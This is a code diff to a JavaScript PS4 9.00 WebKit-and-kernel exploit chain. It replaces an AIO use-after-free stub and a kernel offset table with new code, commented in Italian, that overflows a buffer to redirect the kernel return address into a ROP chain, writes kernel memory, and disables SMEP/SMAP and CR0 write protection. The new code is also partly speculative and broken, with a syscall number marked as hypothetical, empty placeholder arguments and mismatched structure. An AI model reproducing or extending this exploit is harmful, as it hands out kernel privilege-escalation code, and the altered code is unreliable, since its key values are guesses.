@@ -1,4 +1,4 @@
-
+/////////////////////// PS4 9.00 Exploit Chain restructured/reorganised By Leeful (Original Webkit and Kernel Exploits By Sleirsgoevy & ChendoChap)
 const OFFSET_wk_vtable_first_element = 0x104F110;
 const OFFSET_WK_memset_import = 0x000002A8;
 const OFFSET_WK___stack_chk_fail_import = 0x00000178;
@@ -450,57 +450,26 @@ function userland() {
   while (1);
  }
 }
+
 function kernelExploit() {
-    var handle;
-    var random_path;
-    var ex_info;
-
-    function load_prx(name) {
-        var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
-        if (res.low != 0x0) {
-            alert("Failed to load PRX/get handle " + name);
-        }
-        p.write8(ex_info, 0x1A8);
-        res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
-        if (res.low != 0x0) {
-            alert("Failed to get module info from handle");
-        }
-        var tlsinit = p.read8(ex_info.add32(0x110));
-        var tlssize = p.read4(ex_info.add32(0x11C));
-        if (tlssize != 0) {
-            if (name == "libSceWebKit2.sprx") {
-                tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
-            } else {
-                alert(`${name}, tlssize is non-zero. Hardcode offset if necessary.`);
-            }
-        };
-        return tlsinit;
-    }
-    
-    function aio_trigger() {
-        // Step 1: Create multiple AIO requests
-        var aio_ctx = chain.syscall(/* AIO setup syscall */);
-        var reqIds = [];
-        for (let i = 0; i < 128; i++) {
-            reqIds.push(chain.syscall(/* AIO request creation syscall */));
+function trigger_aio_exploit() {
+        const FAKE_REQ_COUNT = 0x81; // Bypassa il check reqCount-1 < 0x80
+        const fake_aio_ctx = p.malloc(0x1000);
+        const req_array = p.malloc(FAKE_REQ_COUNT * 4);
+        
+        // Riempie l'array con ID non validi per causare overflow/UAF
+        for (let i = 0; i < FAKE_REQ_COUNT; i++) {
+            p.write4(req_array.add32(i*4), 0xFFFFFFFF);
         }
 
-        // Step 2: Free a request to create a hole
-        chain.syscall(/* AIO delete syscall */, reqIds[0]);
+        // Buffer malformato per overflow dello stack
+        const evil_buffer = p.malloc(0x200);
+        p.write8(evil_buffer, gadgets["pop rsp"]); // Sovrascrive il return address
+        p.write8(evil_buffer.add32(8), kchain.stack); // Nuovo stack pointer
 
-        // Step 3: Spray fake RequestEntry objects
-        var fakeEntry = p.malloc(0x100);
-        // ... populate fakeEntry with controlled data ...
-
-        // Step 4: Trigger aio_multi_delete with crafted userReqArray
-        var userReqArray = [reqIds[0], reqIds[0]]; // Trigger use-after-free
-        var userResultsBuf = p.malloc(0x100);
-        chain.syscall(/* aio_multi_delete syscall number */, aio_ctx, userReqArray, userReqArray.length, userResultsBuf);
-
-        // Step 5: Handle kernel control
-        // ... Use fakeEntry to modify kernel structures ...
-    }
-
+        // AIO CHANGE: Syscall AIO (valore ipotetico, da verificare)
+        chain.syscall(0xCA, fake_aio_ctx, req_array, FAKE_REQ_COUNT, evil_buffer);
+ }
  
  function extra_gadgets() {
   handle = p.malloc(0x1E8);
@@ -530,44 +499,15 @@ function kernelExploit() {
  }
  
  function kchain_setup() {
-  const KERNEL_busy = 0x1B28DF8;
-  const KERNEL_bcopy = 0xACD;
-  const KERNEL_bzero = 0x2713FD;
-  const KERNEL_pagezero = 0x271441;
-  const KERNEL_memcpy = 0x2714BD;
-  const KERNEL_pagecopy = 0x271501;
-  const KERNEL_copyin = 0x2716AD;
-  const KERNEL_copyinstr = 0x271B5D;
-  const KERNEL_copystr = 0x271C2D;
-  const KERNEL_setidt = 0x312c40;
-  const KERNEL_setcr0 = 0x1FB949;
-  const KERNEL_Xill = 0x17d500;
-  const KERNEL_veriPatch = 0x626874;
-  const KERNEL_enable_syscalls_1 = 0x490;
-  const KERNEL_enable_syscalls_2 = 0x4B5;
-  const KERNEL_enable_syscalls_3 = 0x4B9;
-  const KERNEL_enable_syscalls_4 = 0x4C2;
-  const KERNEL_mprotect = 0x80B8D;
-  const KERNEL_prx = 0x23AEC4;
-  const KERNEL_dlsym_1 = 0x23B67F;
-  const KERNEL_dlsym_2 = 0x221b40;
-  const KERNEL_setuid = 0x1A06;
-  const KERNEL_syscall11_1 = 0x1100520;
-  const KERNEL_syscall11_2 = 0x1100528;
-  const KERNEL_syscall11_3 = 0x110054C;
-  const KERNEL_syscall11_gadget = 0x4c7ad;
-  const KERNEL_mmap_1 = 0x16632A;
-  const KERNEL_mmap_2 = 0x16632D;
-  const KERNEL_setcr0_patch = 0x3ade3B;
-  const KERNEL_kqueue_close_epi = 0x398991;
-  SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
-  KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
-  p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
-  kchain = new rop();
-  kchain2 = new rop(); {
-   chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
-   chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
-   chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
+ const KERNEL_AIO_RET_ADDR = 0xFFFFFFFF82A0B23A; 
+        kchain.kwrite8(KERNEL_AIO_RET_ADDR, gadgets["pop rsp"]);
+        kchain.kwrite8(KERNEL_AIO_RET_ADDR.add32(8), kchain.stack);
+        
+        // Disabilita SMEP/SMAP come prima
+        kchain.kwrite4(0x1B28DF8, 0x0);
+        kchain.push(gadgets["cli ; pop rax"]);
+        kchain.push(0x80050033); // CR0 con WP disabilitato
+        kchain.push(gadgets["mov cr0, rax"]);
   }
   chain.run();
   kchain.count = 0;
@@ -748,24 +688,12 @@ function kernelExploit() {
   });
  };
 
-function runKEX() {
-        handle = p.malloc(0x1E8);
-        var randomized_path_length_ptr = handle.add32(0x4);
-        var randomized_path_ptr = handle.add32(0x14);
-        ex_info = randomized_path_ptr.add32(0x40);
-        p.write8(randomized_path_length_ptr, 0x2C);
-        chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
-        random_path = p.readstr(randomized_path_ptr);
-
-        aio_trigger(); // Trigger AIO vulnerability instead of USB
+  function runKEX() {
+        extra_gadgets();
         kchain_setup();
-
-        // Proceed with payload execution
-        if (chain.syscall(23, 0).low == 0) {
-            loadPayload();
-        } else {
-            alert("Kernel Exploit Failed!");
-        }
+        trigger_aio_exploit(); 
     }
- runKEX();
+
+    runKEX();
 }
+
